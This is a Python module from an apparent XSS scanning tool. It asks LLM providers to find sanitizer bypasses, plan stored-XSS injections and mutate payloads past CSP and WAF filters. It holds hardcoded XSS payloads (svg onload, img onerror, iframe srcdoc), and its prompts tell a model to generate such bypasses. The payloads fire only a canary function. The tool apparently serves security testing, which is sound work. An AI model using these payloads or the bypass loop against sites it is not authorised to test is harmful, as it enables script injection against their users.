"""
LLM Semantic Triage, Stored XSS & Iterative Mutation Engine.

Provides an optional, graceful LLM-driven analysis layer using Structured JSON Outputs for:
1. Custom Sanitizer Bypass Analysis
2. Minified Component De-obfuscation
3. Multi-Step & Stored XSS Payload Planning
4. Iterative CSP / WAF Bypass Mutation Loop

Gracefully falls back to heuristic evaluation when no LLM provider/key is configured
or upon network/timeout errors.
"""

from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.error import URLError
from urllib.request import Request, urlopen


@dataclass
class SanitizerAnalysisResult:
    """Result of LLM sanitizer bypass evaluation."""
    is_safe: bool
    bypass_possible: bool
    vulnerability_details: str
    bypass_payload: str
    confidence: float


@dataclass
class ComponentClassificationResult:
    """Result of component de-obfuscation analysis."""
    is_vendor_runtime: bool
    component_name: str
    has_custom_sinks: bool
    dangerous_directives: List[str] = field(default_factory=list)


@dataclass
class StoredXSSPlan:
    """Multi-step stored XSS payload plan."""
    endpoint: str
    http_method: str
    field_name: str
    payload: str
    reasoning: str


class LLMTriageEngine:
    """
    Configurable LLM semantic triage client supporting OpenAI, Gemini,
    Anthropic, Ollama, and OpenAI-compatible endpoints.
    """

    def __init__(
        self,
        provider: Optional[str] = None,
        api_key: Optional[str] = None,
        model: Optional[str] = None,
        endpoint: Optional[str] = None,
        timeout: float = 12.0,
    ) -> None:
        try:
            from xoxss.core.config import load_dotenv
            load_dotenv()
        except Exception:
            pass

        self.provider = (provider or os.environ.get("XOXSS_LLM_PROVIDER", "")).strip().lower()
        self.api_key = (
            api_key
            or os.environ.get("XOXSS_LLM_KEY", "")
            or os.environ.get("OPENAI_API_KEY", "")
            or os.environ.get("GEMINI_API_KEY", "")
            or os.environ.get("ANTHROPIC_API_KEY", "")
        ).strip()
        self.model = (model or os.environ.get("XOXSS_LLM_MODEL", "")).strip()
        self.endpoint = (endpoint or os.environ.get("XOXSS_LLM_ENDPOINT", "")).strip()
        self.timeout = timeout

        # Smart provider deduction
        if not self.provider or self.provider == "none":
            if self.endpoint and ("localhost" in self.endpoint or "11434" in self.endpoint or "ollama" in self.endpoint):
                self.provider = "ollama"
            elif os.environ.get("ANTHROPIC_API_KEY") and not (os.environ.get("OPENAI_API_KEY") or os.environ.get("GEMINI_API_KEY")):
                self.provider = "anthropic"
            elif os.environ.get("GEMINI_API_KEY") and not os.environ.get("OPENAI_API_KEY"):
                self.provider = "gemini"
            elif self.api_key:
                self.provider = "openai"

        # Provider-specific key fallback
        if self.provider == "anthropic" and os.environ.get("ANTHROPIC_API_KEY") and not api_key:
            self.api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
        elif self.provider == "gemini" and os.environ.get("GEMINI_API_KEY") and not api_key:
            self.api_key = os.environ.get("GEMINI_API_KEY", "").strip()
        elif self.provider == "openai" and os.environ.get("OPENAI_API_KEY") and not api_key:
            self.api_key = os.environ.get("OPENAI_API_KEY", "").strip()

        self.enabled = bool(self.api_key or (self.provider == "ollama") or self.endpoint)

        # Defaults
        if not self.model:
            if self.provider == "gemini":
                self.model = "gemini-2.5-flash"
            elif self.provider == "anthropic":
                self.model = "claude-3-5-sonnet-latest"
            elif self.provider == "ollama":
                self.model = "llama3.2"
            else:
                self.model = "gpt-4o-mini"

    # -------------------------------------------------------------------------
    # 1. Custom Sanitizer Bypass Analysis
    # -------------------------------------------------------------------------
    def analyze_custom_sanitizer(self, sanitizer_code: str, test_input: str = "") -> SanitizerAnalysisResult:
        """
        Analyze custom sanitization code to identify regex/parsing bypasses.
        """
        if not self.enabled:
            return self._fallback_sanitizer_analysis(sanitizer_code)

        system_prompt = (
            "You are an application security expert in XSS sanitizers. "
            "Analyze the provided JavaScript sanitization code. "
            "Determine if the function safely neutralizes XSS or if it has bypasses "
            "(e.g. single-pass regex stripping, allowing onload/onerror on svg/img, missing case-insensitivity, "
            "or broken attribute parsers). "
            "Output strictly a JSON object matching this schema:\n"
            "{\n"
            '  "is_safe": boolean,\n'
            '  "bypass_possible": boolean,\n'
            '  "vulnerability_details": "explanation of flaw",\n'
            '  "bypass_payload": "exact test payload bypassing this function",\n'
            '  "confidence": float between 0.0 and 1.0\n'
            "}"
        )
        user_prompt = f"Sanitizer Code:\n```javascript\n{sanitizer_code[:3000]}\n```\nTest Input Context: {test_input}"

        resp = self._chat_completion(system_prompt, user_prompt)
        if resp:
            try:
                data = json.loads(self._extract_json_block(resp))
                return SanitizerAnalysisResult(
                    is_safe=bool(data.get("is_safe", False)),
                    bypass_possible=bool(data.get("bypass_possible", True)),
                    vulnerability_details=str(data.get("vulnerability_details", "")),
                    bypass_payload=str(data.get("bypass_payload", "")),
                    confidence=float(data.get("confidence", 0.7)),
                )
            except Exception:
                pass

        return self._fallback_sanitizer_analysis(sanitizer_code)

    def _fallback_sanitizer_analysis(self, code: str) -> SanitizerAnalysisResult:
        """Heuristic fallback for custom sanitizer inspection."""
        lower = code.lower()
        flawed_patterns = [
            (r"\.replace\s*\(\s*['\"]<script>['\"]", "Single string replace without global regex (/g)"),
            (r"\.replace\s*\(\s*/<script[^>]*>.*?<\/script>/i", "Regex removes <script> but allows <img src=x onerror=...> and SVG"),
            (r"\.replace\s*\(\s*/<script>/gi", "Replaces only exact <script> tag; bypass via <scr<script>ipt> or event handlers"),
        ]
        for pat, detail in flawed_patterns:
            if re.search(pat, code, re.IGNORECASE):
                return SanitizerAnalysisResult(
                    is_safe=False,
                    bypass_possible=True,
                    vulnerability_details=detail,
                    bypass_payload="<svg/onload=window.__xoxss_verify('canary')>",
                    confidence=0.85,
                )

        # Check recognized standard libraries
        if "dompurify" in lower or "sanitizehtml" in lower or "validator.escape" in lower:
            return SanitizerAnalysisResult(
                is_safe=True,
                bypass_possible=False,
                vulnerability_details="Standard recognized HTML sanitizer library in use",
                bypass_payload="",
                confidence=0.9,
            )

        return SanitizerAnalysisResult(
            is_safe=False,
            bypass_possible=True,
            vulnerability_details="Unverified custom sanitizer implementation",
            bypass_payload="<img src=x onerror=window.__xoxss_verify('canary')>",
            confidence=0.5,
        )

    # -------------------------------------------------------------------------
    # 2. Minified Component De-obfuscation
    # -------------------------------------------------------------------------
    def deobfuscate_component(self, code_slice: str) -> ComponentClassificationResult:
        """
        Distinguish vendor framework boilerplate from custom component logic.
        """
        if not self.enabled:
            return self._fallback_component_classification(code_slice)

        system_prompt = (
            "You are a frontend code auditor. Analyze this minified JavaScript snippet. "
            "Determine whether this snippet is internal vendor boilerplate (Vue 3, Alpine, React diffing, jQuery core) "
            "or custom first-party application component logic. "
            "Output strictly a JSON object matching this schema:\n"
            "{\n"
            '  "is_vendor_runtime": boolean,\n'
            '  "component_name": "name or unknown",\n'
            '  "has_custom_sinks": boolean,\n'
            '  "dangerous_directives": ["v-html", "x-html", etc.]\n'
            "}"
        )

        resp = self._chat_completion(system_prompt, f"Code snippet:\n{code_slice[:2500]}")
        if resp:
            try:
                data = json.loads(self._extract_json_block(resp))
                return ComponentClassificationResult(
                    is_vendor_runtime=bool(data.get("is_vendor_runtime", False)),
                    component_name=str(data.get("component_name", "unknown")),
                    has_custom_sinks=bool(data.get("has_custom_sinks", False)),
                    dangerous_directives=list(data.get("dangerous_directives", [])),
                )
            except Exception:
                pass

        return self._fallback_component_classification(code_slice)

    def _fallback_component_classification(self, code: str) -> ComponentClassificationResult:
        """Heuristic fallback for framework detection."""
        from xoxss.analysis.framework_sinks import is_framework_internal_sink

        is_vendor = is_framework_internal_sink(code, code)
        directives = []
        if "v-html" in code:
            directives.append("v-html")
        if "x-html" in code:
            directives.append("x-html")
        if "dangerouslySetInnerHTML" in code:
            directives.append("dangerouslySetInnerHTML")

        return ComponentClassificationResult(
            is_vendor_runtime=is_vendor,
            component_name="vendor_runtime" if is_vendor else "app_component",
            has_custom_sinks=bool(directives),
            dangerous_directives=directives,
        )

    # -------------------------------------------------------------------------
    # 3. Multi-Step & Stored XSS Payload Reasoning
    # -------------------------------------------------------------------------
    def plan_stored_xss_payload(
        self,
        api_endpoint: str,
        schema_json: str,
        render_sink: str,
    ) -> StoredXSSPlan:
        """
        Craft a schema-valid JSON body for an API endpoint that triggers XSS on downstream views.
        """
        if not self.enabled:
            return StoredXSSPlan(
                endpoint=api_endpoint,
                http_method="POST",
                field_name="name",
                payload="<script>window.__xoxss_verify('stored')</script>",
                reasoning="Default fallback payload",
            )

        system_prompt = (
            "You are an authorized security testing assistant. Given an API endpoint schema and a downstream DOM sink, "
            "generate a valid JSON payload that conforms to the field types (string, email, url, etc.) "
            "while embedding an XSS trigger `window.__xoxss_verify('stored')`. "
            "Output strictly a JSON object:\n"
            "{\n"
            '  "endpoint": "target endpoint",\n'
            '  "http_method": "POST/PUT",\n'
            '  "field_name": "target field",\n'
            '  "payload": "payload value",\n'
            '  "reasoning": "why this passes validation and reaches sink"\n'
            "}"
        )
        user_prompt = f"Endpoint: {api_endpoint}\nSchema:\n{schema_json[:2000]}\nDownstream Sink: {render_sink}"

        resp = self._chat_completion(system_prompt, user_prompt)
        if resp:
            try:
                data = json.loads(self._extract_json_block(resp))
                return StoredXSSPlan(
                    endpoint=str(data.get("endpoint", api_endpoint)),
                    http_method=str(data.get("http_method", "POST")),
                    field_name=str(data.get("field_name", "content")),
                    payload=str(data.get("payload", "<svg/onload=window.__xoxss_verify('stored')>")),
                    reasoning=str(data.get("reasoning", "")),
                )
            except Exception:
                pass

        return StoredXSSPlan(
            endpoint=api_endpoint,
            http_method="POST",
            field_name="content",
            payload="<svg/onload=window.__xoxss_verify('stored')>",
            reasoning="Fallback standard stored vector",
        )

    # -------------------------------------------------------------------------
    # 4. Iterative CSP / WAF Bypass Mutation Loop
    # -------------------------------------------------------------------------
    def mutate_for_csp_waf(
        self,
        payload: str,
        block_reason: str,
        csp_header: str = "",
        iteration: int = 1,
    ) -> str:
        """
        Mutate an blocked payload based on observed CSP/WAF errors (up to 3 iterations).
        """
        if iteration > 3 or not self.enabled:
            return self._fallback_mutation(payload, block_reason)

        system_prompt = (
            "You are an application security payload specialist. A proof-of-concept XSS payload was blocked. "
            "Mutate the payload to bypass the specific constraint (e.g. CSP script-src, blocked keyword, WAF pattern). "
            "The execution must invoke `window.__xoxss_verify('mutated')`. "
            "Return ONLY the raw payload string with no markdown formatting or explanation."
        )
        user_prompt = f"Original Payload: {payload}\nBlock Reason / Error: {block_reason}\nCSP Header: {csp_header}"

        resp = self._chat_completion(system_prompt, user_prompt)
        if resp:
            clean_resp = resp.strip().strip("`").strip()
            if clean_resp.startswith("```"):
                clean_resp = re.sub(r"^```[a-zA-Z]*\n?", "", clean_resp).rstrip("`").strip()
            if clean_resp:
                return clean_resp

        return self._fallback_mutation(payload, block_reason)

    def _fallback_mutation(self, payload: str, block_reason: str) -> str:
        """Heuristic rule-based bypass mutations."""
        lower_reason = block_reason.lower()
        if "script" in lower_reason or "tag" in lower_reason:
            return "<svg/onload=window.__xoxss_verify('mutated')>"
        if "autofocus" in lower_reason or "focus" in lower_reason:
            return "<details open ontoggle=window.__xoxss_verify('mutated')>"
        if "csp" in lower_reason or "unsafe-inline" in lower_reason:
            return "<iframe srcdoc='<script>window.__xoxss_verify(\"mutated\")</script>'></iframe>"
        return "<img src=x onerror=window.__xoxss_verify('mutated')>"

    # -------------------------------------------------------------------------
    # Low-Level Network Transport
    # -------------------------------------------------------------------------
    def _chat_completion(self, system_prompt: str, user_prompt: str) -> Optional[str]:
        """Send chat request using stdlib urllib to avoid external dependencies."""
        try:
            if self.provider == "gemini":
                return self._call_gemini(system_prompt, user_prompt)
            elif self.provider == "anthropic":
                return self._call_anthropic(system_prompt, user_prompt)
            else:
                return self._call_openai_compatible(system_prompt, user_prompt)
        except Exception:
            return None

    def _call_openai_compatible(self, system_prompt: str, user_prompt: str) -> Optional[str]:
        endpoint = self.endpoint or "https://api.openai.com/v1/chat/completions"
        if self.provider == "ollama" and not self.endpoint:
            endpoint = "http://localhost:11434/v1/chat/completions"

        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.api_key}",
        }
        body = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt},
            ],
            "temperature": 0.1,
        }
        req = Request(endpoint, data=json.dumps(body).encode("utf-8"), headers=headers, method="POST")
        with urlopen(req, timeout=self.timeout) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data["choices"][0]["message"]["content"]

    def _call_gemini(self, system_prompt: str, user_prompt: str) -> Optional[str]:
        endpoint = f"https://generativelanguage.googleapis.com/v1beta/models/{self.model}:generateContent?key={self.api_key}"
        body = {
            "system_instruction": {"parts": [{"text": system_prompt}]},
            "contents": [{"parts": [{"text": user_prompt}]}],
            "generationConfig": {"temperature": 0.1},
        }
        req = Request(endpoint, data=json.dumps(body).encode("utf-8"), headers={"Content-Type": "application/json"}, method="POST")
        with urlopen(req, timeout=self.timeout) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data["candidates"][0]["content"]["parts"][0]["text"]

    def _call_anthropic(self, system_prompt: str, user_prompt: str) -> Optional[str]:
        endpoint = "https://api.anthropic.com/v1/messages"
        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        }
        body = {
            "model": self.model,
            "max_tokens": 1024,
            "system": system_prompt,
            "messages": [{"role": "user", "content": user_prompt}],
            "temperature": 0.1,
        }
        req = Request(endpoint, data=json.dumps(body).encode("utf-8"), headers=headers, method="POST")
        with urlopen(req, timeout=self.timeout) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data["content"][0]["text"]

    @staticmethod
    def _extract_json_block(text: str) -> str:
        """Extract clean JSON object from LLM response markdown."""
        text = text.strip()
        match = re.search(r"\{.*\}", text, re.DOTALL)
        if match:
            return match.group(0)
        return text

